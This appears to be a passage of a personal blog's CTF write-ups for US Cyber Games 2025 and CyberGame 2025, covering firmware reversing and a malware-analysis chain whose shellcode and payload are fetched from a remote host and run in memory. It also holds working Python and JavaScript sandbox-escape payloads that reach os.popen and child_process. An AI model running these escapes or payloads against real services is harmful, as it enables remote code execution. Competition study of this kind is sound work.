get:\nredactable.pdf:friends4eva Password: friends4eva\nStep 2: Decrypt the PDF # Now we can unlock the PDF using qpdf:\nqpdf --password=friends4eva --decrypt redactable.pdf clean.pdf Opening clean.pdf, we find… a completely black image Step 3: Extract the Image # pdfimages -all clean.pdf extracted This produces a swirled/distorted image. Step 4: Unswirl the Image (GIMP) # Open the extracted image in GIMP, then:\nGo to Filters \u0026gt; Distorts \u0026gt; Whirl and Pinch\nSet Whirl = -519 (adjust until it looks correct)\nYou’ll now see the hidden flag in clear text\nSVUSCG{oops_i_did_it_again_i_didnt_redact} OLED Gadget Password Recovery # Description\noled-gadget.elf, oled-gadget.elf.i64, and oled-gadget.bin sh1108v2.0.pdf — a datasheet for the OLED display controller used in the device\nRecover the password displayed on the SH1108-based OLED screen during device startup — no hardware access. The flag is rendered by the firmware, so we must reverse engineer it.\nUnderstanding the Display Controller # The SH1108 PDF provides critical insight:\nIt\u0026rsquo;s a 160×160 monochrome OLED with a page-oriented memory (each page = 8 vertical pixels × N horizontal columns).\nThe system uses Segment Remap (0xA1) and Common Scan Direction Reverse (0xC8) to flip the image horizontally and vertically.\nThe code initializes the OLED to 128×160 display mode using 0xA9, 0x02.\nInterpretation:\nSegment Remap = 0xA1: Horizontal flip (SEG[159-X])\nScan Direction = 0xC8: Vertical flip (COM[N-1] to COM0)\nSo any image in memory is rendered rotated 180° on screen.\nExtracting the Display Buffer # The firmware copies a portion of .rodata directly into the OLED framebuffer:\nmemcpy(sh1108_frame_buffer_raw, \u0026amp;_etext, 0xA00); // 2560 bytes That’s 2560 bytes total (0xA00), and it’s sent to the screen using a driver for the SH1108 OLED controller. I opened the PDF to confirm exactly how this works — and yeah, it helped a ton.\nWhat I confirmed from the SH1108 PDF: # The display is 160x160, but the firmware only writes 128 columns × 160 rows (that’s 20 pages of 128 bytes).\nThe command 0xA9, 0x02 in the init sequence sets the resolution to 128 rows x 160 SEG, with COM16 to COM143 active.\nThe controller uses page addressing mode (0x20), and writes 128 bytes per page.\nNow, more importantly:\nSegment Re-map (0xA1) → flips the image horizontally.\nCommon Output Scan Direction (0xC8) → flips the image vertically.\nThat combo? It\u0026rsquo;s a 180° rotation of the image stored in .rodata when rendered.\nI checked how the framebuffer was set: the first byte goes to GDDRAM column 16, and with the segment remap, that maps to SEG143. The last byte maps to SEG16. That confirms the horizontal flip.\nFor the vertical part, page 0 appears at the bottom due to the 0xC8 command, and page 19 at the top.\nSo with this confirmed from the datasheet, I wrote a quick Python script that:\nParses the .rodata bytes from the ELF dump.\nReconstructs the framebuffer (160 rows, 128 columns).\nApplies the horizontal and vertical flips as per the SH1108 config.\nOutputs the correct image: initial_display_sh1108.png.\nWhen I rendered it — boom, the flag was right up. No need for hardware emulation.\nimport re from PIL import Image rodata_dump = \u0026#34;\u0026#34;\u0026#34; .rodata:080064BD DCB 0xF0 .rodata:080064BE DCB 0xF0 .rodata:080064BF DCB 0xDC .rodata:080064C0 DCB 0xDC .rodata:080064C1 DCB 0xCE .rodata:080064C2 DCB 0xCE .rodata:080064C3 DCB 0xCE .rodata:080064C4 DCB 0xEE .rodata:080064C5 DCB 0xE .rodata:080064C6 DCB 0xE .rodata:080064C7 DCB 0xDC .rodata:080064C8 DCB 0xF0 .rodata:080064C9 DCB 0xF0 .rodata:080064CA DCB 0 .rodata:08006697 DCB 0xE1 .rodata:08006698 DCB 0x2A .rodata:08006699 DCB 0 .rodata:0800669A DCB 8 .rodata:0800669B DCB 0 .rodata:0800669C DCB 0 .rodata:0800669D DCB 0 .rodata:0800669E DCB 0 .rodata:0800669F DCB 0 .rodata:080066B2 DCB 0xAF .rodata:080066B3 ALIGN 4 \u0026#34;\u0026#34;\u0026#34; #truncated FRAME_WIDTH = 128 FRAME_HEIGHT = 160 BYTES_PER_PAGE = FRAME_WIDTH NUM_PAGES = FRAME_HEIGHT // 8 TOTAL_BYTES = BYTES_PER_PAGE * NUM_PAGES start_addr = 0x08005C88 end_addr = start_addr + TOTAL_BYTES data_bytes = {} for line in rodata_dump.strip().splitlines(): match = re.match(r\u0026#39;\\.rodata:(080[0-9A-F]{5})\\s+DCB\\s+((?:0x[0-9A-Fa-f]+|[0-9]+)(?:\\s*,\\s*(?:0x[0-9A-Fa-f]+|[0-9]+))*)\u0026#39;, line) if match: addr = int(match.group(1), 16) values = [int(v, 16) if v.startswith(\u0026#34;0x\u0026#34;) else int(v) for v in match.group(2).split(\u0026#39;,\u0026#39;)] for offset, val in enumerate(values): data_bytes[addr + offset] = val frame_buffer_data = [data_bytes.get(start_addr + i, 0) for i in range(TOTAL_BYTES)] intermediate_pixels = [[0 for _ in range(FRAME_WIDTH)] for _ in range(FRAME_HEIGHT)] for page in range(NUM_PAGES): page_y = page * 8 for col in range(FRAME_WIDTH): byte_val = frame_buffer_data[page * FRAME_WIDTH + col] for bit in range(8): if (byte_val \u0026gt;\u0026gt; bit) \u0026amp; 1: intermediate_pixels[page_y + bit][col] = 1 img = Image.new(\u0026#39;1\u0026#39;, (FRAME_WIDTH, FRAME_HEIGHT), color=255) pixels = img.load() for y in range(FRAME_HEIGHT): for x in range(FRAME_WIDTH): if intermediate_pixels[y][x]: x_disp = FRAME_WIDTH - 1 - x y_disp = FRAME_HEIGHT - 1 - y pixels[x_disp, y_disp] = 0 output_filename = \u0026#34;flag.png\u0026#34; img.save(output_filename) print(f\u0026#34;Image saved as \u0026#39;{output_filename}\u0026#39;\u0026#34;) SVUSCG{Gen3=BestGen} ","date":"June 20, 2025","externalUrl":null,"permalink":"/posts/2025-06-20-uscybergames2025/","section":"Posts","summary":"\u003cp\u003eThis write up documents the challenges I solved during the US Cyber Games 2025 , specifically in the categories of \u003cstrong\u003ePwn\u003c/strong\u003e, \u003cstrong\u003eForensics\u003c/strong\u003e, \u003cstrong\u003eReverse Engineering\u003c/strong\u003e, and \u003cstrong\u003eCryptography\u003c/strong\u003e. Each section walks through my process—from analyzing binary exploits and reconstructing OLED display data to decrypting protected files and extracting browser artifacts.\u003c/p\u003e","title":"US CyberGames","type":"posts"},{"content":"I took 1st place 🥇 in CyberGame 2025, solving 71 out of 73 challenges and claiming 52 First bloods 🩸 along the way. The game featured a wide variety of categories, including:\nWeb Exploitation \u0026amp; Binary Exploitation\nForensics\nOSINT (Open Source Intelligence)\nCryptography\nMalware Analysis \u0026amp; Reverse Engineering\nProcess and Governance\nPyJails _(as part of the JAILE series)\nHere are writeups for a few of the challenges I found particularly interesting.\n[★★☆] The Chronicles of Greg # SystemUpdate incident report # Description\nGreg didn’t ask for this. Greg wanted a quiet Friday, maybe a donut, and ideally no malware. But no. Instead, Greg found logs weird logs. And when Greg sees weird logs, Greg investigates. This is Greg’s story.\n############\nAnalyst Log – 09:14 AM: \u0026ldquo;They called it a \u0026rsquo;low-priority anomaly.\u0026rsquo; Said it was probably nothing. That’s what they always\nsay before things explode\u0026rdquo;. I ran strings on the file didn’t like what I saw. Not an update. Not even ransomware. Just…\nvibes. Binary vibes. They’ve named it internally ‘SystemUpdate.’ I don’t know why. No update was done. I’m not even sure\nif this is about system update anymore.\n############\nSolution # While reverse engineering the system_update binary, I focused on a suspicious subroutine sub_20C0. It stood out due to a sequence of unusual operations applied to a hardcoded array of bytes, suggesting some form of custom encoding or obfuscation logic.\nUpon further inspection, I recognized a pattern of reversible transformations involving XORs, subtractions, and negations all acting on a 24-byte sequence. To decode this, I wrote a Python script to emulate the logic statically. The script essentially reverses three types of encoding operations: chr = (key - (encoded_byte ^ 0x5C)) \u0026amp; 0xFF , chr = (- (encoded_byte ^ 0x5C)) \u0026amp; 0xFF and chr = (encoded_byte ^ key) \u0026amp; 0xFF\ndef solve(): target = [int(x, 16) for x in \u0026#34;F9 FF 8F E0 EA C6 FE 2A CC 9D E6 9A 92 D3 C4 CB 20 E1 DF D7 95 E0 CC 2F\u0026#34;.split()] ops = [ (1, 0xF8), (1, 0xEE), (2, None), (3, 0xA3), (1, 0xFB), (1, 0xEC), (1, 0xF6), (1, 0xF1), (1, 0xF7), (1, 0xF4), (1, 0xF1), (1, 0xFD), (3, 0xA3), (1, 0xFD), (3, 0xA3), (1, 0xF6), (1, 0xEC), (1, 0xF1), (1, 0xFC), (1, 0xF7), (1, 0xF9), (1, 0xF0), (1, 0xF4), (1, 0xF0) ] flag = [] for i in range(24): op, k = ops[i] t = target[i] if op == 1: c = (k - (t ^ 0x5C)) \u0026amp; 0xFF elif op == 2: c = (- (t ^ 0x5C)) \u0026amp; 0xFF elif op == 3: c = (t ^ k) \u0026amp; 0xFF flag.append(chr(c)) s = \u0026#39;\u0026#39;.join(flag) print(s) # verify check = [] for i in range(24): op, k = ops[i] c = ord(s[i]) if op == 1: o = ((k - c) \u0026amp; 0xFF) ^ 0x5C elif op == 2: o = ((-c) \u0026amp; 0xFF) ^ 0x5C elif op == 3: o = c ^ k check.append(o \u0026amp; 0xFF) if check == target: print(\u0026#34;ok\u0026#34;) else: print(\u0026#34;fail\u0026#34;) if __name__ == \u0026#34;__main__\u0026#34;: solve() SK-CERT{g3771ng_p4yl04d} The Blob Whisperer # Description\nAnalyst Log – 12:47 PM: The blob showed up after SystemUpdate did its thing. Just a data. No extension. No metadata. No readme. No hope. The problem? There. Is. No. Key. I’ve tried dictionary attacks, rainbow tables, entropy analysis, even feeding it to a very confused intern. Nothing… At one point, I shouted my Wi-Fi password at the screen out of raw frustration. Didn’t help, but I felt better for two seconds. I thought I saw a familiar pattern in the entropy graph. Turns out it was just a coffee stain on my monitor. This isn’t just encryption. This is a test of character. And Greg? Greg is not winning.\nSolution\nWhen analyzing the system_update binary, I discovered that running it with a parameter causes it to connect to a remote server and transmit that input. If the provided value is incorrect, the server responds with a generic command like COMMAND: apt update.\nTo uncover the remote endpoint, I first ran strings on the binary, which revealed an embedded IP address. To confirm this and identify the port being used, I used strace, which clearly showed the binary establishing a connection to that address and port during execution.\nconnect(3, {sa_family=AF_INET, sin_port=htons(7052), sin_addr=inet_addr(\u0026#34;195.168.112.4\u0026#34;)}, 16) = 0 If the value is the flag SK-CERT{g3771ng_p4yl04d} we got in the first part then it responds by sending an encrypted payload Function sub_1D20 does the decryption of the payload\n__int64 __fastcall sub_1D20(__int64 a1, unsigned int a2) { __int64 v2; // r14 unsigned int v3; // eax __int64 v4; // r14 __int64 v5; // rax int v6; // ebx int v7; // ebx void *v8; // rax void (*v9)(void); // rax int v11; // [rsp+Ch] [rbp-105Ch] BYREF _BYTE v12[16]; // [rsp+10h] [rbp-1058h] BYREF _BYTE v13[16]; // [rsp+20h] [rbp-1048h] BYREF _BYTE src[4152]; // [rsp+30h] [rbp-1038h] BYREF v2 = 0; v3 = sub_1C30(\u0026#34;/lib/x86_64-linux-gnu/libc.so.6\u0026#34;); srand(v3); do { v12[v2] = rand() % 256; v13[v2++] = rand() % 256; } while ( v2 != 16 ); v4 = EVP_CIPHER_CTX_new(); v5 = EVP_aes_128_cbc(); EVP_DecryptInit_ex(v4, v5, 0, v12, v13); EVP_DecryptUpdate(v4, src, \u0026amp;v11, a1, a2); v6 = v11; if ( (int)EVP_DecryptFinal_ex(v4, \u0026amp;src[v11], \u0026amp;v11) \u0026lt;= 0 ) { EVP_CIPHER_CTX_free(v4); } else { v7 = v11 + v6; EVP_CIPHER_CTX_free(v4); if ( v7 \u0026gt;= 0 ) { src[v7] = 0; v8 = mmap(0, (int)a2, 7, 34, -1, 0); if ( v8 != (void *)-1LL ) { v9 = (void (*)(void))memcpy(v8, src, v7); v9(); return 0; } perror(\u0026#34;mmap\u0026#34;); } } return 1; } The key used for encryption in the system_update binary is generated using rand(), which is seeded via srand() with a value derived from the major and minor version of the current libc.\nDuring analysis, I noticed that the first 5 bytes of the payload are discarded before encryption. After removing these bytes from the captured payload, I brute-forced potential seeds using a small C script that simulated the encryption process based on different libc versions. This led me to discover that version 2.38 was the correct one used to seed the random number generator.\nTo retrieve the payload, I saved the encrypted data using:\necho \u0026#34;SK-CERT{g3771ng_p4yl04d}\u0026#34; | nc 195.168.112.4 7052 \u0026gt; payload.bin #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;openssl/evp.h\u0026gt; #include \u0026lt;openssl/aes.h\u0026gt; unsigned int gen_seed(unsigned int major, unsigned int minor) { unsigned int val = (major \u0026lt;\u0026lt; 16) | (minor \u0026lt;\u0026lt; 8) | (major ^ minor); val = (val ^ (val \u0026gt;\u0026gt; 13)) * 0x5bd1e995; return val ^ (val \u0026gt;\u0026gt; 15); } int decrypt(const char* in_file, const char* out_file, unsigned int seed) { FILE* f = fopen(in_file, \u0026#34;rb\u0026#34;); if (!f) return -1; fseek(f, 0, SEEK_END); long len = ftell(f); fseek(f, 0, SEEK_SET); unsigned char* enc = malloc(len); fread(enc, 1, len, f); fclose(f); unsigned char key[16], iv[16]; srand(seed); for (int i = 0; i \u0026lt; 16; i++) { key[i] = rand() \u0026amp; 0xFF; iv[i] = rand() \u0026amp; 0xFF; } unsigned char* dec = malloc(len + AES_BLOCK_SIZE); int l, dec_len; EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new(); EVP_DecryptInit_ex(ctx, EVP_aes_128_cbc(), NULL, key, iv); EVP_DecryptUpdate(ctx, dec, \u0026amp;l, enc, len); dec_len = l; if (EVP_DecryptFinal_ex(ctx, dec + l, \u0026amp;l) \u0026gt; 0) { dec_len += l; FILE* out = fopen(out_file, \u0026#34;wb\u0026#34;); if (out) { fwrite(dec, 1, dec_len, out); fclose(out); printf(\u0026#34;[+] %s ok\\n\u0026#34;, out_file); } } else { printf(\u0026#34;[-] %s fail\\n\u0026#34;, out_file); } EVP_CIPHER_CTX_free(ctx); free(enc); free(dec); return 0; } int main() { const char* infile = \u0026#34;payload.bin\u0026#34;; char outfile[256]; for (unsigned int major = 2; major \u0026lt;= 2; major++) { for (unsigned int minor = 21; minor \u0026lt;= 41; minor++) { unsigned int seed = gen_seed(major, minor); snprintf(outfile, sizeof(outfile), \u0026#34;%u.%u_deciphered.bin\u0026#34;, major, minor); decrypt(infile, outfile, seed); } } return 0; } After decrypting the payload and inspecting it with xxd, I noticed interesting strings like /tmp/s and /bin/s, suggesting that the payload was actually shellcode. To confirm this, I mapped the decrypted payload into memory and executed it. Upon running the shellcode, I observed that it dropped a file into the /tmp directory.\nCode to map the decrypted payload into memory\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;sys/mman.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; int main() { FILE *f = fopen(\u0026#34;2.38_deciphered.bin\u0026#34;, \u0026#34;rb\u0026#34;); if (!f) { perror(\u0026#34;open\u0026#34;); return 1; } fseek(f, 0, SEEK_END); long sz = ftell(f); rewind(f); char *buf = malloc(sz); if (!buf) { perror(\u0026#34;malloc\u0026#34;); fclose(f); return 1; } if (fread(buf, 1, sz, f) != sz) { perror(\u0026#34;read\u0026#34;); free(buf); fclose(f); return 1; } fclose(f); void *mem = mmap(0, sz, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0); if (mem == MAP_FAILED) { perror(\u0026#34;mmap\u0026#34;); free(buf); return 1; } memcpy(mem, buf, sz); free(buf); printf(\u0026#34;\u0026gt;\u0026gt; running shellcode...\\n\u0026#34;); ((void(*)())mem)(); munmap(mem, sz); return 0; } A quick check confirmed that the contents were successfully written into the /tmp directory. curl http://files.cybergame.sk/systemupdate-2b174d89-564b-4024-acb6-b195f4c81a3c/lib.so#SK-CERT{b1n_p4yl04d_d035_n07_s33m5_l1k3_c0mm4nd5} \u0026gt; /lib_safe/x86_64-linux-gnu/libc.so.6 SK-CERT{b1n_p4yl04d_d035_n07_s33m5_l1k3_c0mm4nd5} The Shared Object Prophecy # Description\nAnalyst Log – 17:23 PM: I followed the execution trail. It ended in the most cursed way imaginable: custom libc Who writes their own libc? What kind of monster wakes up and chooses that? Greg is tired. Greg is afraid. Greg wants his weekend back.\nSolution\nAfter retrieving the libc.so file from the previous part of the challenge, the description made it clear this was no ordinary standard library. It was custom and likely hiding something.\nI spent hours going in circles, completely lost in its disassembly. I tried diffing it against the original libc, hoping for any meaningful differences. I scanned through dozens of standard functions, chasing false leads.\nEventually, while combing through some of the more commonly hooked libc functions, I landed on _GI___libc_write. That’s where things clicked. The function had extra instructions and patterns that resembled encryption logic.\nI wrote a script to reverse the transformations applied in that function and it paid off.\nSometimes, the best hiding place is right where you expect things to be \u0026ldquo;normal.\u0026rdquo;\ndef s1(buf): if len(buf) != 29: raise ValueError(\u0026#34;s1: bad len\u0026#34;) out = bytearray(29) for i in range(29): x = buf[i] ^ i x = ~x \u0026amp; 0xFF x = (x - i) \u0026amp; 0xFF x = (x ^ i) \u0026amp; 0xFF x = (x + i) \u0026amp; 0xFF x = ((x \u0026lt;\u0026lt; 3) | (x \u0026gt;\u0026gt; 5)) \u0026amp; 0xFF x = (-((x + i) \u0026amp; 0xFF) ^ i) \u0026amp; 0xFF x = (x - i) \u0026amp; 0xFF x = (x ^ i) \u0026amp; 0xFF t = ((x - 0x7F) ^ 0x74) \u0026amp; 0xFF out[i] = (i - t) \u0026amp; 0xFF return out def s2(buf): if len(buf) != 14: raise ValueError(\u0026#34;s2: bad len\u0026#34;) out = bytearray(14) for i in range(14): x = buf[i] x = (x + i) \u0026amp; 0xFF x = (x ^ i) \u0026amp; 0xFF x = (x + 99) \u0026amp; 0xFF x = (x ^ i) \u0026amp; 0xFF x = (x + 0x78) \u0026amp; 0xFF x = (x ^ 0x7F) \u0026amp; 0xFF x = (x + i) \u0026amp; 0xFF x = (-x) \u0026amp; 0xFF x = (x ^ 0xE0) \u0026amp; 0xFF x = ((x \u0026lt;\u0026lt; 1) | (x \u0026gt;\u0026gt; 7)) \u0026amp; 0xFF term1 = (x ^ i) \u0026amp; 0xFF term2 = (0x2C - i) \u0026amp; 0xFF out[i] = (term1 + term2) \u0026amp; 0xFF return out def main(): s = bytes([ 0xea, 0x06, 0xe0, 0x44, 0x23, 0x20, 0x96, 0xcc, 0x1e, 0xae, 0x64, 0xe3, 0x00, 0x09, 0xeb, 0x27, 0xd5, 0xd7, 0xac, 0x81, 0xea, 0xd5, 0x5e, 0xdf, 0x5a, 0xae, 0x2c, 0x14, 0xfc ]) s2_buf = bytes([ 0x06, 0x09, 0x0c, 0x85, 0x12, 0x8f, 0x82, 0x81, 0x16, 0x15, 0x91, 0x85, 0x90, 0x3c ]) t1 = s1(s) print(\u0026#34;s1:\u0026#34;, t1.hex()) try: print(\u0026#34;s1_ascii:\u0026#34;, t1.decode(errors=\u0026#39;replace\u0026#39;)) except Exception as e: print(\u0026#34;s1 decode error:\u0026#34;, e) print(\u0026#34;-\u0026#34; * 30) t2 = s2(s2_buf) print(\u0026#34;s2:\u0026#34;, t2.hex()) try: s2_ascii = t2.split(b\u0026#39;\\x00\u0026#39;, 1)[0].decode(errors=\u0026#39;replace\u0026#39;) print(\u0026#34;s2_ascii:\u0026#34;, s2_ascii) except Exception as e: print(\u0026#34;s2 decode error:\u0026#34;, e) if __name__ == \u0026#34;__main__\u0026#34;: main() SK-CERT{br1n6_y0ur_0wn_l1bc} JAILE2 # Calculator v2 # Description\nA new version of The Calculator came out! Can you check if it’s secure? exp.cybergame.sk:7011\nChallenge\nimport math def handle_client(): print( \u0026#34;Welcome to the Calculator v2!\\nWith improved security so you can have access to all the fun math stuff and the bad guys cannot do the bad stuff! Enjoy :D\u0026#34; ) # We added this to prevent the user from calling dangerous functions safe_globals = { \u0026#34;__builtins__\u0026#34;: { \u0026#34;sin\u0026#34;: math.sin, \u0026#34;cos\u0026#34;: math.cos, \u0026#34;tan\u0026#34;: math.tan, \u0026#34;asin\u0026#34;: math.asin, \u0026#34;acos\u0026#34;: math.acos, \u0026#34;atan\u0026#34;: math.atan, \u0026#34;sqrt\u0026#34;: math.sqrt, \u0026#34;pow\u0026#34;: math.pow, \u0026#34;abs\u0026#34;: abs, \u0026#34;round\u0026#34;: round, \u0026#34;min\u0026#34;: min, \u0026#34;max\u0026#34;: max, \u0026#34;sum\u0026#34;: sum, } } text = \u0026#34;\u0026#34; while text != \u0026#34;exit\u0026#34;: text = input(\u0026#34;\u0026gt;\u0026gt;\u0026gt; \u0026#34;) # In all ctf writeups they use _ or its unicode equivalent to somehow escape the jail. No _ means no fun for them for character in [\u0026#34;_\u0026#34;, \u0026#34;＿\u0026#34;]: if character in text.lower(): print(\u0026#34;Not allowed, killing\\n\u0026#34;) text = \u0026#34;lol\u0026#34; try: print(eval(text, safe_globals)) except Exception as e: print(\u0026#34;Error: \u0026#34; + str(e) + \u0026#34;\\n\u0026#34;) def main(): handle_client() if __name__ == \u0026#34;__main__\u0026#34;: main() Solution\nThe challenge was basically a Python sandbox, but with a twist. It uses eval() to evaluate user input, but it wraps it in a restricted safe_globals dict that only exposes a few safe functions mostly math stuff like sin, cos, sqrt, abs, round, and so on. No access to eval, exec, open, or even __builtins__ directly.\nBut the real kicker is this it blocks any use of the underscore character (_) even the full-width Unicode one (＿). And if you’ve done any Python sandbox stuff before, you know that’s brutal. All the classic tricks rely on double underscores: __class__, __subclasses__, __globals__, etc. So with _ banned, all the usual escape routes are cut off.\nSo whatever payload you’re building has to work without typing _ at all. That’s what makes this challenge spicy you have to find clever ways to build those dunders without ever writing them directly.\nDealing with _ Restrictions via Unicode Normalization # One of the main restrictions in this challenge is that you cannot use the underscore character (_) directly nor its full-width Unicode equivalent (＿). This is enforced by checking the user input string and terminating if any variant appears. However, Python internally normalizes many Unicode characters under the hood, and we can take advantage of this using NFKC normalization\nTo find all Unicode characters that normalize to _ I ran this simple script:\nimport unicodedata for x in range(65537): if unicodedata.normalize(\u0026#34;NFKC\u0026#34;, chr(x)) == \u0026#34;_\u0026#34;: print(x, chr(x)) This helps identify characters that look different but will be interpreted as _ internally by Python once normalized.\nFrame Walking Without _ # With _ completely off the table, I needed a way to access powerful objects like __import__, but without writing any underscores at all.\nThe trick was to use generator introspection to access Python’s internal frames. From there, you can walk up the call stack and eventually reach the built-in namespace. Here\u0026rsquo;s the payload I crafted:\n[y := [], y.extend([(x.gi︴frame.f︴back.f︴back for x in y)]), [x for x in y[0]][0].f︴builtins[\u0026#39;\\x5f\\x5fimport\\x5f\\x5f\u0026#39;](\u0026#39;os\u0026#39;).popen(\u0026#39;cat /flag*\u0026#39;).read()] A breakdown:\ny := [] initializes an empty list\nI use a generator expression to capture frames: x.gi︴frame.f︴back.f︴back\nThe character ︴ (U+FE34) is not technically an underscore, but under Unicode normalization (NFKC), Python interprets it as one.\nThen I access f︴builtins and use a hex escape: '\\x5f\\x5fimport\\x5f\\x5f' to call __import__ without triggering the input filter.\nThe rest is a standard file read using os.popen.\nThis works because the generator\u0026rsquo;s gi_frame gives you access to the current frame object, and walking f_back lets you move up the stack. Once you reach the top, you can access the global __builtins__ object and import anything you want\nSK-CERT{wh0_w0uld_h4v3_th0ght_y0u_c4n_3sc4pe_w1th0ut__} Tasty Bun # Description\nThe Tasty Bun bakery asked us for a pentest. Can you find a vulnerability in their baking software?\n#!/usr/bin/env bun const net = require(\u0026#34;net\u0026#34;); const bake = async (ingredients) =\u0026gt; { return await eval(ingredients); }; const hasValidIngredients = (recipe) =\u0026gt; { const FORBIDDEN_INGREDIENTS = /[()\\/\\[\\];\u0026#34;\u0026#39;_!]/; if (FORBIDDEN_INGREDIENTS.test(recipe)) { console.error(\u0026#34;🥖 These ingredients will spoil our bun!\u0026#34;); return false; } const flavors = \u0026#34;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\u0026#34;; const tasteProfile = []; for (let i = 0; i \u0026lt; recipe.length; i++) { const ingredient = recipe[i]; if (flavors.includes(ingredient) \u0026amp;\u0026amp; !tasteProfile.includes(ingredient)) { tasteProfile.push(ingredient); } } if (tasteProfile.length \u0026gt; 2) { console.error( \u0026#34;🍞 Too many flavors will ruin the bun! Found \u0026#34; + tasteProfile.length ); return false; } return true; }; const bakery = net.createServer((customer) =\u0026gt; { console.log(\u0026#34;🥐 A hungry customer has arrived at the bakery!\u0026#34;); customer.write(\u0026#34;tasty-bun\u0026gt; \u0026#34;); customer.on(\u0026#34;data\u0026#34;, async (order) =\u0026gt; { try { const recipe = order.toString().trim(); if (recipe === \u0026#34;exit\u0026#34;) { customer.write(\u0026#34;🥯 Thank you for visiting our bakery! Goodbye!\\n\u0026#34;); customer.end(); return; } if (!hasValidIngredients(recipe)) { customer.write(\u0026#34;🍩 Sorry, we can\u0026#39;t bake with these ingredients!\\n\u0026#34;); customer.write(\u0026#34;tasty-bun\u0026gt; \u0026#34;); return; } const bakedBun = await bake(recipe); customer.write(bakedBun + \u0026#34;\\n\u0026#34;); } catch (e) { console.error(\u0026#34;Error during baking:\u0026#34;, e); customer.write(\u0026#34;🥞 Oops! The bun fell flat: \u0026#34; + e.toString() + \u0026#34;\\n\u0026#34;); } customer.write(\u0026#34;tasty-bun\u0026gt; \u0026#34;); }); customer.on(\u0026#34;error\u0026#34;, (err) =\u0026gt; { console.error(\u0026#34;Socket error:\u0026#34;, err); customer.write(\u0026#34;🥯 A socket error occurred, but we\u0026#39;re still open!\\n\u0026#34;); customer.write(\u0026#34;tasty-bun\u0026gt; \u0026#34;); }); customer.on(\u0026#34;end\u0026#34;, () =\u0026gt; { console.log(\u0026#34;🥨 A customer has left our bakery\u0026#34;); }); }); process.on(\u0026#34;unhandledRejection\u0026#34;, (reason, promise) =\u0026gt; { console.error(\u0026#34;Unhandled Rejection at:\u0026#34;, promise, \u0026#34;reason:\u0026#34;, reason); }); process.on(\u0026#34;uncaughtException\u0026#34;, (err) =\u0026gt; { console.error(\u0026#34;Unhandled exception caught:\u0026#34;, err); }); const displayBakeryBanner = () =\u0026gt; { console.log(` 🍞🥐🥖🥯🍩🥨 \u0026#34;The Tasty Bun\u0026#34; Bakery 🥨🍩🥯🥖🥐🍞 Welcome to our special bun shop! We are very particular about our ingredients... `); }; displayBakeryBanner(); bakery.listen(2337, () =\u0026gt; { console.log(\u0026#34;🍞 Bakery now open on port 2337! Come get your tasty buns!\u0026#34;); }); Solution\nAt first glance, this challenge seems like a simple JavaScript sandbox running on the Bun runtime. But very quickly, the core limitation becomes clear:\nYou\u0026rsquo;re only allowed to use 2 unique letters per line.\nThat means any line you send to the server must contain at most two different alphabetical characters. You can repeat them as much as you want, but a third unique letter will instantly get your input rejected.\nOn top of that, several critical characters are completely banned:\n() / [ ] ; \u0026quot; ' _ !\nThese restrictions stop you from doing just about everything you\u0026rsquo;d normally try in a JavaScript eval() challenge:\n❌ () — No function calls. You can\u0026rsquo;t invoke anything directly.\n❌ [] — No arrays or property access by string key (e.g., obj[\u0026quot;key\u0026quot;]).\n❌ ; — No statement separators.\n❌ ' or \u0026quot; — No strings at all.\n❌ / — No regular expressions, and also no division.\n❌ _ — No access to special objects like __proto__, __defineGetter__, or globalThis.\n❌ ! — No use of logical negation or tricks like ![].\nEssentially, this removes most of the language features you\u0026rsquo;d typically abuse in a sandbox escape: you can’t use strings, arrays, object keys, or even call functions the usual way.\nSo the challenge becomes: How can we coerce or manipulate what’s left just numbers, operators, and two letters to eventually execute something useful?\nDespite all the restrictions, the key weakness lies in how the server handles input: it uses eval() on the user’s input, but only after first checking if the input passes a regex match using test().\nThis is our entry point. If we can pollute the prototype of RegExp and replace the test method with eval, then the next time the server tries to check our input using regex, it will actually end up evaluating it as JavaScript code without any restrictions.\nIn JavaScript, prototype pollution lets you overwrite properties shared across all objects of a certain type. Here, we exploit that to overwrite RegExp.prototype.test.\nfrom pwn import * import re FLAG_RE = re.compile(r\u0026#34;flag.+\\.txt\u0026#34;) def e(s): r = \u0026#34;\u0026#34; for x in s: r += \u0026#34;\\\\u00\u0026#34; + hex(ord(x))[2:].zfill(2) return r # r = remote(\u0026#34;localhost\u0026#34;, 2337) r = remote(\u0026#34;exp.cybergame.sk\u0026#34;,7012) encoded_regexp = e(\u0026#34;RegExp\u0026#34;) encoded_proto = e(\u0026#34;__proto__\u0026#34;) encoded_test = e(\u0026#34;test\u0026#34;) encoded_eval = e(\u0026#34;eval\u0026#34;) get_flag_file_payload = \u0026#34;\u0026#34;\u0026#34; res = process.mainModule.require(\u0026#34;child_process\u0026#34;).spawnSync(\u0026#34;ls\u0026#34;, [\u0026#34;..\u0026#34;]).stdout.toString();throw new Error(res); \u0026#34;\u0026#34;\u0026#34;.strip() r.sendlineafter(b\u0026#34;\u0026gt; \u0026#34;, f\u0026#34;$={encoded_regexp}``\u0026#34;.encode()) r.sendlineafter(b\u0026#34;\u0026gt; \u0026#34;, f\u0026#34;$$={encoded_eval}\u0026#34;.encode()) r.sendlineafter(b\u0026#34;\u0026gt; \u0026#34;, f\u0026#34;$.{encoded_proto}.{encoded_test}=$$\u0026#34;) r.sendlineafter(b\u0026#34;\u0026gt; \u0026#34;, get_flag_file_payload) r.recvuntil(b\u0026#34;Error: \u0026#34;) files = r.recvuntil(b\u0026#34;tasty-bun\u0026#34;, True).decode() flag_path = FLAG_RE.search(files).group(0) print_flag_file_payload = f\u0026#34;\u0026#34;\u0026#34; res = process.mainModule.require(\u0026#34;child_process\u0026#34;).spawnSync(\u0026#34;cat\u0026#34;, [\u0026#34;../{flag_path}\u0026#34;]).stdout.toString();throw new Error(res); \u0026#34;\u0026#34;\u0026#34; r.sendline(print_flag_file_payload) print(r.recvuntil(b\u0026#34;tasty-bun\u0026#34;).decode()) r.interactive() SK-CERT{\\u0074\\u0068\\u0069\\u0073\\u0020\\u0069\\u0073\\u0020\\u0066\\u0075\\u006E} dictFS # Description\nThe admin of this application supposedly implemented a backdoor. Can you find it?\nRecover the root password # After 